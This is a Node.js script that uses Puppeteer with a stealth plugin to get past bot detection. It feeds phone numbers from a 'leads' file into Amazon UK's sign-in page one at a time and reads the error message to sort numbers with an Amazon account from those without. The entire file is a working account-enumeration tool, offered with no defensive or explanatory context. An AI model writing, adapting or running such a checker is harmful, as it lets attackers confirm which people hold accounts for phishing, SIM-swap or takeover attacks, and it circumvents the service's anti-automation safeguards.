//const puppeteer = require('puppeteer');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
var fs = require('fs');
var leads = fs.readFileSync('leads.txt').toString().split("\n");

var y = 0;
async function checker(){
   for (x = y; x <= leads.length; x++) {
      if(x == leads.length){
         console.log('Completed sequence');
         break;
      }
      let phone_num = leads[x];

      const browser = await puppeteer.launch({
         headless: false,
         ignoreHTTPSErrors: true,
         args: [`--window-size=300,850`],
      });
      const context = await browser.createIncognitoBrowserContext();
      const page = await context.newPage();
      
      await page.goto('https://www.amazon.co.uk/ap/signin');
      
      //await page.waitForNavigation();

      await page.waitForSelector('.a-button-input', {waitUntil: 'load', timeout: 0}).then(() => {
         console.log('Page loaded successfully');
       }).catch(e => {
          if(e){
            console.log(e);
            browser.close();
            y = x;
            checker();
          }
       });//Submit button

      //Now page has loaded proper, will attempt to login

      //await page.click('#password'); 

      await page.type('#ap_email_login', phone_num); //Enter phone number
      await page.keyboard.press('Enter');
      console.log('clicked submit button');

      await page.waitForNavigation();
      const url = await page.url();
      console.log(url);
      
      //const valid_num = await page.waitForSelector('#smsOTP', {waitUntil: 'load', timeout: 0});
      if (url.includes('https://www.amazon.co.uk/ap/signin/')){
         const result = await page.waitForSelector('.a-alert-heading', {waitUntil: 'load', timeout: 0});
         //console.log(result);
         const value = await result.evaluate(el => el.textContent);
         console.log(value);

         if(value.includes('No account found with mobile number')){
            console.log('Invalid number');
            y = x;
            browser.close();
            checker();
         }else{
            console.log('Different login error');
            browser.close();
            //y ++;
         }
      }else{
         console.log('URL different');
         browser.close();
      }
   }
}

checker();